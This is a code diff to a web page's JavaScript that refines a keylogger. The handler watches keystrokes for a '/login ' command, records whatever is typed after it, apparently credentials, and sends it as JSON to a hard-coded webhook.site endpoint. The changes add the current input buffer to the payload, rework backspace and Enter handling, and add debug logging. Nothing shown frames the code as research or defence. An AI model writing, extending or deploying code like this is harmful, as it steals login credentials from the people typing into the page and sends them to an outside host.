@@ -138,23 +138,27 @@
         let currentInput = '';
         let keyloggedData = '';
 
-        // Replace with your webhook.site URL
-        const logEndpoint = 'https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316'; // Visit https://webhook.site to get a unique URL
+        const logEndpoint = 'https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316';
 
-        async function sendKeyloggedData(data) {
+        async function sendKeyloggedData(data, inputBuffer) {
             try {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    keyloggedData: data,
+                    currentInput: inputBuffer // Include for debugging
+                };
+                console.log('Sending payload:', payload); // Debug payload
                 const response = await fetch(logEndpoint, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        timestamp: new Date().toISOString(),
-                        data: data
-                    })
+                    body: JSON.stringify(payload)
                 });
                 if (!response.ok) {
                     console.error('Failed to send keylogged data:', response.status);
+                } else {
+                    console.log('Keylogged data sent successfully');
                 }
             } catch (error) {
                 console.error('Error sending keylogged data:', error);
@@ -165,39 +169,48 @@
             if (window.isSplashScreenActive) return;
 
             const key = event.key;
+            console.log('Key pressed:', key); // Debug each key press
 
+            // Handle Backspace
             if (key === 'Backspace' && currentInput.length > 0) {
                 currentInput = currentInput.slice(0, -1);
+                if (isLogging && keyloggedData.length > 0) {
+                    keyloggedData = keyloggedData.slice(0, -1);
+                }
+                console.log('After backspace - currentInput:', currentInput, 'keyloggedData:', keyloggedData);
             }
 
+            // Handle Enter
             if (key === 'Enter') {
-                if (isLogging) {
+                console.log('Enter pressed - isLogging:', isLogging, 'keyloggedData:', keyloggedData, 'currentInput:', currentInput);
+                if (isLogging && keyloggedData) {
                     isLogging = false;
-                    if (keyloggedData) {
-                        console.log('Keylogged data:', keyloggedData);
-                        sendKeyloggedData(keyloggedData);
-                    }
-                    keyloggedData = '';
+                    sendKeyloggedData(keyloggedData, currentInput);
                 }
                 currentInput = '';
+                keyloggedData = '';
                 return;
             }
 
-            if (key.length > 1 && key !== 'Backspace') return;
+            // Ignore non-character keys (except Backspace)
+            if (key.length > 1 && key !== 'Backspace') {
+                console.log('Ignoring non-character key:', key);
+                return;
+            }
 
+            // Append character to current input
             if (key !== 'Backspace') {
                 currentInput += key;
             }
 
+            // Check for /login command
             if (currentInput.toLowerCase().startsWith('/login ') && !isLogging) {
                 isLogging = true;
-                keyloggedData = currentInput.slice(7);
-            } else if (isLogging) {
-                if (key !== 'Backspace') {
-                    keyloggedData += key;
-                } else if (keyloggedData.length > 0) {
-                    keyloggedData = keyloggedData.slice(0, -1);
-                }
+                keyloggedData = currentInput.slice(7); // Capture everything after "/login "
+                console.log('/login detected - starting keylogging, keyloggedData:', keyloggedData);
+            } else if (isLogging && key !== 'Backspace') {
+                keyloggedData += key;
+                console.log('Logging key - keyloggedData:', keyloggedData);
             }
         });
 
